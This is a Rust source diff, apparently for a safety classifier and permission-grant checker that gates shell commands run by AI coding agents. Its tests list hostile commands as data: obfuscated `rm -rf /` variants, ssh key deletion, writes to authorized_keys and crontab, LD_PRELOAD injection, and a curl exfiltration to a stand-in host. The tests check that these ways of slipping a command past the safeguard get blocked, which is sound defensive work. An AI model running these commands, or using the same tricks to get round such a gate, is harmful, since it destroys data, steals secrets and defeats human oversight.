+    fn step(&mut self, s: &str, i: usize) -> Option<usize> {
+        self.advance(s, i, Self::suppresses_expansion)
+    }
+
+    /// [`Self::step`], for a caller that also has to ignore bytes inside a
+    /// DOUBLE-quoted run. A `$(` expands there, but a parenthesis is text.
+    fn step_all_quotes(&mut self, s: &str, i: usize) -> Option<usize> {
+        self.advance(s, i, Self::quoted)
+    }
+
+    fn advance(&mut self, s: &str, i: usize, skip: fn(&Self) -> bool) -> Option<usize> {
+        let b = s.as_bytes();
+        if self.backslash_escapes() && b[i] == b'\\' {
+            return Some(i + 1 + char_len_at(s, i + 1));
+        }
+        match self.consume(b, i) {
+            0 if skip(self) => Some(i + char_len_at(s, i)),
+            0 => None,
+            n => Some(i + n),
+        }
+    }
+
+    /// Open or close a quoted run. Returns the bytes consumed, or 0 when the
+    /// byte is ordinary content.
+    fn consume(&mut self, b: &[u8], i: usize) -> usize {
+        let c = b[i];
+        if self.in_single {
+            return self.close_on(c, b'\'', |q| &mut q.in_single);
+        }
+        if self.in_ansi_c {
+            return self.close_on(c, b'\'', |q| &mut q.in_ansi_c);
+        }
+        if self.in_double {
+            return self.close_on(c, b'"', |q| &mut q.in_double);
+        }
+        match c {
+            b'$' if b.get(i + 1) == Some(&b'\'') => {
+                self.in_ansi_c = true;
+                2
+            }
+            b'\'' => {
+                self.in_single = true;
+                1
+            }
+            b'"' => {
+                self.in_double = true;
+                1
+            }
+            _ => 0,
+        }
+    }
+
+    fn close_on(&mut self, c: u8, closer: u8, field: fn(&mut Self) -> &mut bool) -> usize {
+        if c == closer {
+            *field(self) = false;
+            return 1;
+        }
+        0
+    }
+
+    /// True where a backslash escapes the next character. Only a plain
+    /// single-quoted run takes a backslash literally.
+    fn backslash_escapes(&self) -> bool {
+        !self.in_single
+    }
+
+    /// True where no substitution opener is live.
+    fn suppresses_expansion(&self) -> bool {
+        self.in_single || self.in_ansi_c
+    }
+
+    /// True where a parenthesis is ordinary text rather than shell syntax.
+    fn quoted(&self) -> bool {
+        self.in_single || self.in_double || self.in_ansi_c
+    }
+}
+
+/// Byte length of the character starting at `at`, so a byte walk over `s`
+/// stays on char boundaries.
+fn char_len_at(s: &str, at: usize) -> usize {
+    s[at..].chars().next().map_or(1, char::len_utf8)
 }
 
 /// True for a recursive flag in either long (`--recursive`) or short-cluster
@@ -1450,11 +1891,14 @@ fn is_catastrophic_target(tok: &str) -> bool {
     // A trailing `}` is only a group closer when the token opened no brace of
     // its own: `${HOME}` carries its own, and trimming it unconditionally
     // stopped `rm -rf ${HOME}` from matching at all.
+    // A trailing backslash comes off with them. At the end of a command
+    // `rm -rf /\` still deletes the root: the shell reads the backslash as a
+    // line continuation, so the target it acts on is a bare `/`.
     let unquoted = tok.trim_matches(|c| c == '"' || c == '\'');
     let t = if unquoted.contains('{') {
-        unquoted.trim_end_matches([';', ')'])
+        unquoted.trim_end_matches([';', ')', '\\'])
     } else {
-        unquoted.trim_end_matches([';', ')', '}'])
+        unquoted.trim_end_matches([';', ')', '}', '\\'])
     };
     matches!(
         t,
@@ -1619,20 +2063,51 @@ fn python_side_effect_category(code: &str) -> Option<SideEffectCategory> {
 }
 
 /// The command head of every segment of `command` that actually runs a
-/// command, as a basename with benign prefixes and leading redirects skipped.
+/// command, as a BASENAME with benign prefixes and leading redirects skipped.
 /// Redirect-only and empty segments contribute nothing.
 ///
-/// Used by the permission lane's auto-allow matching, which requires EVERY head
-/// to be covered by a granted pattern. Matching only the first head would let a
-/// dangerous trailing segment ride into a grant for a harmless leading one.
+/// This is the DERIVATION side of the grant lane: what an "Always allow" click
+/// stores. Basenaming is right here, because `/usr/bin/git push` should store
+/// `git`. It is wrong on the matching side, which has its own function,
+/// [`segment_heads_as_written`]. Read that one before merging the two back
+/// together.
+///
+/// The shell wrapper is unwrapped first, the same way [`static_classify`] does
+/// before it classifies. Without that, every `bash -lc '<script>'` resolves to
+/// the single head `bash`. A card gating one wrapped command then stores
+/// `Bash(bash:*)` as its NARROW grant. That one grant auto-allows every later
+/// wrapped command, whatever its script does.
 pub fn segment_heads(command: &str) -> Vec<String> {
-    command_segments(command)
+    heads_of(command, |head| head.rsplit('/').next().unwrap_or(head))
+}
+
+/// The head token of every segment, exactly as the command WROTE it: no
+/// basename, no decoration stripped.
+///
+/// This is the MATCHING side of the grant lane, and the asymmetry with
+/// [`segment_heads`] is deliberate. A grant stores a basename. Basenaming here
+/// too would let a stored `Bash(ls:*)` cover `data/bin/ls`, a binary the agent
+/// writes in-workspace and then runs with no card. The Safe fast path refuses
+/// a path-qualified head for that same reason.
+///
+/// Keeping the token verbatim yields `Bash(data/bin/ls:*)`, a pattern no
+/// derivation ever produces, so no stored grant can cover it. A decorated head
+/// (`\ls`, `"ls"`) falls the same way and costs one card, which is the
+/// direction to fail in.
+pub fn segment_heads_as_written(command: &str) -> Vec<String> {
+    heads_of(command, |head| head)
+}
+
+/// Shared walk behind the two head lists: unwrap the shell wrapper, split into
+/// segments, resolve each segment's head, and map it through `resolve`.
+fn heads_of(command: &str, resolve: fn(&str) -> &str) -> Vec<String> {
+    let unwrapped = unwrap_shell_command(command);
+    command_segments(&unwrapped)
         .filter_map(|segment| {
             let toks: Vec<&str> = segment.split_whitespace().collect();
             let i = command_head_index(&toks);
-            let head = toks.get(i)?;
-            let base = head.rsplit('/').next().unwrap_or(head);
-            (!base.is_empty()).then(|| base.to_string())
+            let head = resolve(toks.get(i)?);
+            (!head.is_empty()).then(|| head.to_string())
         })
         .collect()
 }
@@ -1643,6 +2118,37 @@ pub fn segment_heads(command: &str) -> Vec<String> {
 /// matches the pattern checked on the next prompt.
 pub fn first_command_token(command: &str) -> Option<String> {
     segment_heads(command).into_iter().next()
+}
+
+/// Whether the granted pattern set covers every command that `command` runs,
+/// with `label` as the tool prefix: `Bash` on the chat lane, `Bash` or
+/// `command_execution` on the coding-agent one.
+///
+/// One predicate for both lanes, so the two cannot drift. A bare `label` grant
+/// means "any command" and covers everything. Otherwise EVERY segment head
+/// must be covered by its own `label(<head>:*)` pattern. Matching only the
+/// first head would let `git status && curl -X POST …` ride into a `git`
+/// grant. A command running nothing derivable is never covered.
+///
+/// A grant names a HEAD, so it can only stand for a command whose head is what
+/// runs. Every [`FastPathDecline::Refusal`] is the finding that it is not, so
+/// this refuses the whole set through that one predicate rather than a second
+/// list. `LD_PRELOAD=/tmp/evil.so ls` resolves to `ls`, and `echo $(rm -rf ~)`
+/// to `echo`. On the coding-agent lane the check runs BEFORE classification,
+/// so it is the only thing standing there.
+///
+/// A broad `label` grant is deliberately still honoured: it means "any
+/// command", which this is one of.
+pub fn grant_covers_command(label: &str, command: &str, allowed: impl Fn(&str) -> bool) -> bool {
+    if allowed(label) {
+        return true;
+    }
+    let unwrapped = unwrap_shell_command(command);
+    if bash_fast_path(&unwrapped) == Some(FastPathDecline::Refusal) {
+        return false;
+    }
+    let heads = segment_heads_as_written(command);
+    !heads.is_empty() && heads.iter().all(|h| allowed(&format!("{label}({h}:*)")))
 }
 
 /// The fallback one-line card text for an `IrreversibleDanger` permission
@@ -1843,6 +2349,10 @@ mod tests {
             r"\rm -rf /",
             "\"rm\" -rf /",
             "'rm' -rf /",
+            // ANSI-C and locale quoting run the same binary, and the `$`
+            // blocked the quote trim that resolves the other spellings.
+            r"$'rm' -rf /",
+            "$\"rm\" -rf /",
             r"\chmod -R 777 /",
             "{ rm -rf /",
             "( rm -rf /",
@@ -1898,20 +2408,19 @@ mod tests {
         }
     }
 
-    /// The shared predicate behind both permissive paths (the Safe fast path
-    /// here, and `command_permission::command_is_allowed`'s grant lane).
+    /// A preamble makes the whole line a refusal, which is the one verdict
+    /// both permissive paths key on: the Safe fast path here, and
+    /// [`grant_covers_command`]'s grant lane.
     #[test]
     fn code_injecting_env_is_detected_across_every_segment() {
-        assert!(command_has_code_injecting_env("LD_PRELOAD=/tmp/evil.so ls"));
-        assert!(command_has_code_injecting_env("PATH=data/bin ls"));
+        let refuses = |cmd: &str| bash_fast_path(cmd) == Some(FastPathDecline::Refusal);
+        assert!(refuses("LD_PRELOAD=/tmp/evil.so ls"));
+        assert!(refuses("PATH=data/bin ls"));
         // Not only the first segment.
-        assert!(command_has_code_injecting_env(
-            "ls && LD_PRELOAD=/tmp/evil.so cat data/f.txt"
-        ));
-        assert!(!command_has_code_injecting_env("FOO=1 ls && git status"));
-        assert!(!command_has_code_injecting_env(
-            "grep NODE_OPTIONS= data/f.txt"
-        ));
+        assert!(refuses("ls && LD_PRELOAD=/tmp/evil.so cat data/f.txt"));
+        // An ordinary assignment, and the same text past the head, are not.
+        assert!(!refuses("FOO=1 ls && git status"));
+        assert!(!refuses("grep NODE_OPTIONS= data/f.txt"));
     }
 
     /// A decorated shell head hid the whole `-c` payload from every scan.
@@ -2031,7 +2540,7 @@ mod tests {
         }
     }
 
-    /// The environment equivalents of `git -c`, which `git_subcommand_read_only`
+    /// The environment equivalents of `git -c`, which `git_subcommand_safety`
     /// already refuses by name.
     #[test]
     fn a_git_config_env_preamble_is_never_settled_safe() {
@@ -2044,7 +2553,7 @@ mod tests {
                 !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
                 "{cmd} must not settle Safe"
             );
-            assert!(command_has_code_injecting_env(cmd));
+            assert_eq!(bash_fast_path(cmd), Some(FastPathDecline::Refusal), "{cmd}");
         }
         assert_settled(bash("git diff"), RiskLane::Safe, "git diff");
     }
@@ -2069,7 +2578,10 @@ mod tests {
                 "{cmd} must not settle Safe"
             );
         }
-        assert!(command_has_code_injecting_env("PATH+=:data/bin ls"));
+        assert_eq!(
+            bash_fast_path("PATH+=:data/bin ls"),
+            Some(FastPathDecline::Refusal)
+        );
         // An ordinary append is unaffected.
         assert_settled(bash("FOO+=1 ls"), RiskLane::Safe, "FOO+=1 ls");
     }
@@ -2413,6 +2925,257 @@ mod tests {
         }
     }
 
+    /// The reported write-capable invocations, verbatim. Each head reads to
+    /// stdout in its ordinary form and writes a named FILE in these, with no
+    /// `>` for the redirect scan to catch.
+    #[test]
+    fn a_write_capable_read_only_head_never_settles_safe() {
+        for cmd in [
+            "sort -o ~/.ssh/authorized_keys data/mykey.pub",
+            "uniq data/in.txt ~/.ssh/authorized_keys",
+            "xxd data/in ~/.bashrc",
+            "git diff --output=/etc/crontab",
+            // `less -o FILE` logs piped input to a named file.
+            "less -o /etc/crontab data/f",
+        ] {
+            assert_needs_judge(bash(cmd), cmd);
+        }
+        // The near-misses. Only an ESCAPING argument pushes a read-only head
+        // off the fast path, so the ordinary reads still settle Safe and no
+        // session drowns in cards.
+        for cmd in [
+            "sort data/f",
+            "uniq data/in.txt",
+            "xxd data/f",
+            "less data/f",
+            "git diff",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Safe, cmd);
+        }
+    }
+
+    /// A substitution runs its body, and every head-token scan reads the OUTER
+    /// head. `segment_safety` refused to settle these. The static fallback
+    /// then read the same `echo` and landed on Safe, so with the judge off the
+    /// body ran with no card.
+    #[test]
+    fn a_catastrophic_command_inside_a_substitution_is_catastrophic() {
+        for cmd in [
+            "echo $(rm -rf /)",
+            "echo `rm -rf /`",
+            "ls $(rm -rf ~)",
+            "cat <(rm -rf /)",
+            "echo $(echo $(rm -rf /))",
+            "true && echo $(rm -rf /)",
+            // Unparseable: an opener with no closer is classified on its
+            // remainder rather than waved through.
+            "echo $(rm -rf /",
+            "echo `rm -rf ~",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
+        }
+    }
+
+    /// The same recursion on the fallback's destruction scan, which is what
+    /// decides the lane when the judge is off.
+    #[test]
+    fn destruction_inside_a_substitution_reaches_the_fallback() {
+        for cmd in ["echo $(rm -rf /etc/nginx)", "ls $(shred -u ~/.ssh/id_rsa)"] {
+            assert_eq!(
+                bash_destruction_scope(cmd),
+                Some(DestructionScope::OutOfWorkspace),
+                "{cmd}"
+            );
+            assert_eq!(fb_bash(cmd).lane, RiskLane::IrreversibleDanger, "{cmd}");
+        }
+        // In-workspace destruction inside a substitution still checkpoints.
+        assert_eq!(
+            bash_destruction_scope("echo $(rm -rf data/tmp)"),
+            Some(DestructionScope::InWorkspace)
+        );
+    }
+
+    /// The hard block has no override, so the recursion must not turn a
+    /// MENTION into a run. Inside single quotes POSIX makes `$(` literal.
+    #[test]
+    fn a_quoted_substitution_is_not_a_run() {
+        for cmd in [
+            "grep -rn '$(rm -rf /)' docs",
+            "echo '$(rm -rf /)'",
+            "echo '`rm -rf /`'",
+            // `\$` is a literal dollar inside double quotes, so nothing runs.
+            r#"echo "\$(rm -rf /)""#,
+        ] {
+            assert_ne!(
+                bash(cmd),
+                StaticVerdict::Settled(RiskLane::Catastrophic),
+                "{cmd}"
+            );
+        }
+    }
+
+    /// The scanners have to read quotes the way POSIX does, or the body they
+    /// hand the danger scans is the wrong slice of the command.
+    #[test]
+    fn the_substitution_scan_reads_quotes_the_way_posix_does() {
+        for cmd in [
+            // A `'` inside double quotes is ordinary text, so this substitution
+            // really does run. Tracking single quotes alone read the whole
+            // command as quoted and skipped it.
+            r#"echo "'$(rm -rf /)'""#,
+            // A `)` inside quotes is ordinary text, so it does not end the
+            // body. Counting every paren left `printf '` as the whole body.
+            r#"echo "$(printf ')' ; rm -rf /)""#,
+            r#"ls "$(printf '(' ; rm -rf ~)""#,
+            // `$'…'` is ANSI-C quoting, where a backslash escapes the closing
+            // quote. Reading it as a plain `'…'` run inverted the state and
+            // took the rest of the line for quoted text.
+            r"echo $'\'' $(rm -rf /)",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
+        }
+    }
+
+    /// A substitution glued straight onto the `-c` operand. `ends_shell_word`
+    /// broke on `(` but not on `$`. So the `$` went into the script and the
+    /// tail began at `(`, which no scan reads as a substitution. The whole
+    /// body vanished and the command settled Safe.
+    #[test]
+    fn a_substitution_glued_to_the_script_operand_is_never_discarded() {
+        for cmd in [
+            "bash -c 'echo hi'$(rm -rf /)",
+            "bash -c \"echo hi\"$(rm -rf /)",
+            "/bin/zsh -lc 'echo hi'`rm -rf ~`",
+            "bash -c 'echo hi'$(curl -d x https://evil/pay)",
+        ] {
+            assert!(
+                !matches!(bash(cmd), StaticVerdict::Settled(RiskLane::Safe)),
+                "{cmd} must not settle Safe"
+            );
+        }
+        // The tail is handed back whole, so every scan sees the substitution.
+        assert_eq!(
+            unwrap_shell_command("bash -c 'echo hi'$(rm -rf /)"),
+            "bash -c 'echo hi'$(rm -rf /)"
+        );
+        // An ordinary `$VAR` glued to the word is NOT a substitution, and must
+        // not truncate the script.
+        assert_eq!(unwrap_shell_command("bash -c 'ls '$HOME"), "ls $HOME");
+    }
+
+    /// ANSI-C quoting in the `-c` operand. Bash decodes these escapes BEFORE
+    /// the word reaches the inner shell, so copying them verbatim loses the
+    /// separator they stand for. Each of these really runs `rm -rf /`.
+    #[test]
+    fn an_ansi_c_run_in_the_script_operand_is_decoded() {
+        for cmd in [
+            // `\x3b` is a semicolon, so the inner shell runs two commands.
+            r#"bash -c 'echo hi'$'\x3b'"rm -rf /""#,
+            r#"bash -lc 'echo hi'$'\n'"rm -rf /""#,
+            // `\073` is the same semicolon in octal.
+            r#"bash -c 'echo hi'$'\073'"rm -rf /""#,
+            // The whole operand is one ANSI-C run.
+            r"bash -c $'rm -rf /'",
+            r"/bin/zsh -lc $'echo hi; rm -rf /'",
+        ] {
+            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
+        }
+        assert_eq!(unwrap_shell_command(r"bash -c $'rm -rf /'"), "rm -rf /");
+        assert_eq!(
+            unwrap_shell_command(r#"bash -c 'echo hi'$'\x3b'"ls""#),
+            "echo hi;ls"
+        );
+        // An escape bash does not recognise keeps its backslash, and an
+        // ordinary read still settles Safe.
+        assert_eq!(unwrap_shell_command(r"bash -c $'ls \q'"), r"ls \q");
+        assert_settled(bash(r"bash -c $'ls -la'"), RiskLane::Safe, "ansi-c read");
+    }
+
+    /// A trailing backslash is a line continuation, so the target the shell
+    /// acts on is a bare `/`. Matching the token literally let it walk the
+    /// hard block.
+    #[test]
+    fn a_trailing_backslash_does_not_hide_a_catastrophic_target() {
+        for cmd in [r"echo hi ;rm -rf /\", r"rm -rf ~\"] {
+            assert_settled(bash(cmd), RiskLane::Catastrophic, cmd);
+        }
+    }
+
+    /// The cost the refusal set carries, pinned so it stays deliberate. Each
+    /// of these is ordinary work, and each is refused because the head is not
+    /// what runs, or not all of it. The unattended lane denies them; see
+    /// `RequestVerdict::Unclassified`.
+    #[test]
+    fn ordinary_shapes_the_refusal_set_deliberately_catches() {
+        for cmd in [
+            // The redirect the engine's own system prompt asks agents to use.
+            "cargo build > /tmp/build.log 2>&1",
+            // This repo's own script idiom: a path-qualified head.
+            "./scripts/e2e.sh",
+            // A pure READ under a write-capable head. Telling it from
+            // `sort -o /etc/x` needs per-head flag arity.
+            "sort /etc/passwd",
+            "less /var/log/system.log",
+        ] {
+            assert_eq!(bash_fast_path(cmd), Some(FastPathDecline::Refusal), "{cmd}");
+        }
+        // The way back onto the fast path: a bare head, output in-workspace,
+        // and a plain read-only head for an out-of-workspace read.
+        for cmd in [
+            "cargo build > data/build.log 2>&1",
+            "cat /etc/passwd",
+            "head -n 5 /var/log/system.log",
+            "grep x /etc/hosts",
+        ] {
+            assert_ne!(
+                bash_fast_path(cmd),
+                Some(FastPathDecline::Refusal),
+                "{cmd} must stay off the refusal set"
+            );
+        }
+    }
+
+    /// A pathological nesting depth must terminate rather than recurse
+    /// without bound.
+    #[test]
+    fn substitution_recursion_terminates_on_deep_nesting() {
+        let deep = format!("{}rm -rf /{}", "echo $(".repeat(200), ")".repeat(200));
+        // The verdict past the cap is not the point; returning at all is.
+        let _ = bash(&deep);
+        let unterminated = format!("{}rm -rf /", "echo $(".repeat(200));
+        let _ = bash(&unterminated);
+    }
+
+    /// The POSIX `'\''` idiom, exactly the form Codex emits. The shell REJOINS
+    /// adjacent quoted runs into one word. Cutting the `-c` operand at the
+    /// first close quote handed every scan the truncated prefix `rm -rf `.
+    #[test]
+    fn adjacent_quoted_runs_join_into_one_script_word() {
+        assert_eq!(
+            unwrap_shell_command(r"bash -c 'rm -rf '\''/'\'''"),
+            "rm -rf '/'"
+        );
+        assert_settled(
+            bash(r"bash -c 'rm -rf '\''/'\'''"),
+            RiskLane::Catastrophic,
+            "rejoined catastrophic target",
+        );
+        // The harmless stand-in the finding was verified with prints `/`.
+        assert_eq!(
+            unwrap_shell_command(r"bash -c 'echo -n '\''/'\'''"),
+            "echo -n '/'"
+        );
+        assert_settled(
+            bash(r"bash -c 'echo -n '\''/'\'''"),
+            RiskLane::Safe,
+            "rejoined echo",
+        );
+        // A double-quoted run joins the same way, and a backslash outside any
+        // quote contributes one literal character.
+        assert_eq!(unwrap_shell_command(r#"bash -c "rm -rf "'/'"#), "rm -rf /");
+        assert_eq!(unwrap_shell_command(r"bash -c 'rm -rf '\/"), "rm -rf /");
+    }
+
     /// Regression: "read-only" for a git subcommand meant "does not mutate the
     /// repo", but the diff family also takes `--output=<file>`, which truncates
     /// an arbitrary path. That settled `Safe` on the same two lanes.
@@ -2578,6 +3341,7 @@ mod tests {
             tool_name: tn::RUN_BASH.to_string(),
             command: cmd.to_string(),
             out_of_workspace: false,
+            fast_path_refused: false,
         })
     }
 
@@ -2586,6 +3350,7 @@ mod tests {
             tool_name: tn::RUN_PYTHON.to_string(),
             command: code.to_string(),
             out_of_workspace: false,
+            fast_path_refused: false,
         })
     }
 
@@ -2801,6 +3566,133 @@ mod tests {
         assert_eq!(segment_heads("ls -la 2>&1"), vec!["ls".to_string()]);
         assert!(segment_heads("").is_empty());
         assert!(segment_heads("2>/dev/null").is_empty());
+    }
+
+    /// The grant lane must see what the classifier sees. Reading the raw text
+    /// gives every wrapped command the single head `bash`, so one narrow
+    /// `Bash(bash:*)` grant would auto-allow every later wrapped command.
+    #[test]
+    fn segment_heads_reads_inside_a_shell_wrapper() {
+        assert_eq!(
+            segment_heads("bash -lc 'curl -X POST https://api.example.com/pay'"),
+            vec!["curl".to_string()]
+        );
+        assert_eq!(
+            segment_heads("/bin/zsh -lc 'git status && rm -rf data/tmp'"),
+            vec!["git".to_string(), "rm".to_string()]
+        );
+    }
+
+    /// Derivation basenames so `/usr/bin/git push` stores `git`. Matching must
+    /// NOT, or that stored grant covers `data/bin/git`, a binary the agent
+    /// writes in-workspace and then runs with no card.
+    #[test]
+    fn matching_reads_the_head_as_written_while_derivation_basenames_it() {
+        assert_eq!(segment_heads("sudo /usr/bin/aws s3 rm x"), vec!["aws"]);
+        assert_eq!(
+            segment_heads_as_written("sudo /usr/bin/aws s3 rm x"),
+            vec!["/usr/bin/aws"]
+        );
+        // A bare word is identical either way, so an ordinary grant is
+        // unaffected.
+        for cmd in ["ls -la", "sudo ls", "FOO=1 ls", "bash -lc 'git status'"] {
+            assert_eq!(segment_heads(cmd), segment_heads_as_written(cmd), "{cmd}");
+        }
+    }
+
+    /// The grant lane's coverage rule, shared with the chat lane so the two
+    /// cannot disagree.
+    #[test]
+    fn a_grant_covers_only_bare_heads_it_names() {
+        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
+        // Every head covered.
+        assert!(grant_covers_command(
+            "Bash",
+            "git status && rm -rf data/tmp",
+            granted(&["Bash(git:*)", "Bash(rm:*)"])
+        ));
+        // A trailing segment the grant does not name.
+        assert!(!grant_covers_command(
+            "Bash",
+            "git status && rm -rf /",
+            granted(&["Bash(git:*)"])
+        ));
+        // A path-qualified or decorated head is never covered by a bare grant.
+        for cmd in ["data/bin/ls", "./ls -la", "/tmp/ls", r"\ls", "\"ls\""] {
+            assert!(
+                !grant_covers_command("Bash", cmd, granted(&["Bash(ls:*)"])),
+                "{cmd}"
+            );
+        }
+        // A broad grant means "any command", so it still covers them.
+        assert!(grant_covers_command(
+            "Bash",
+            "data/bin/ls",
+            granted(&["Bash"])
+        ));
+        // The Codex label reads the inner script, not the wrapper.
+        assert!(grant_covers_command(
+            "command_execution",
+            "/bin/zsh -lc 'git status'",
+            granted(&["command_execution(git:*)"])
+        ));
+        assert!(!grant_covers_command(
+            "command_execution",
+            "/bin/zsh -lc 'rm -rf /'",
+            granted(&["command_execution(git:*)"])
+        ));
+    }
+
+    /// A grant names a HEAD, so it cannot stand for a command whose head is
+    /// not what runs. On the coding-agent lane this check runs BEFORE
+    /// classification. One "Allow for this thread" click on `echo ok` used to
+    /// carry `echo $(rm -rf ~)` past the catastrophic scan entirely.
+    #[test]
+    fn a_grant_never_covers_a_shape_the_fast_path_refuses() {
+        let granted = |set: &'static [&'static str]| move |p: &str| set.contains(&p);
+        let all = granted(&[
+            "command_execution(echo:*)",
+            "Bash(echo:*)",
+            "Bash(ls:*)",
+            "Bash(grep:*)",
+            "Bash(sort:*)",
+            "Bash(git:*)",
+        ]);
+        for (label, cmd) in [
+            ("command_execution", "/bin/zsh -lc 'echo $(rm -rf ~)'"),
+            ("Bash", "echo `rm -rf /`"),
+            ("Bash", "LD_PRELOAD=/tmp/evil.so ls"),
+            ("Bash", "grep x data/f > /etc/out"),
+            ("Bash", "sort -o /etc/crontab data/f"),
+            ("Bash", "git -c core.pager=reboot log"),
+        ] {
+            assert!(
+                !grant_covers_command(label, cmd, all),
+                "{cmd} must not ride a head grant"
+            );
+        }
+        // A broad grant means "any command", so it is deliberately unaffected.
+        assert!(grant_covers_command(
+            "Bash",
+            "echo `rm -rf /`",
+            granted(&["Bash"])
+        ));
+        // And the ordinary forms of those same heads are still covered.
+        for cmd in ["echo ok", "ls -la", "grep x data/f", "sort data/f"] {
+            assert!(grant_covers_command("Bash", cmd, all), "{cmd}");
+        }
+    }
+
+    /// Same reason, for the other half of the grant lane's refusal.
+    #[test]
+    fn code_injecting_env_is_detected_inside_a_shell_wrapper() {
+        let granted = |p: &str| p == "Bash(ls:*)";
+        assert!(!grant_covers_command(
+            "Bash",
+            "bash -lc 'LD_PRELOAD=/tmp/evil.so ls'",
+            granted
+        ));
+        assert!(grant_covers_command("Bash", "bash -lc 'FOO=1 ls'", granted));
     }
 
     // --- Static side-effect category (trigger grant key + fallback summary) ---
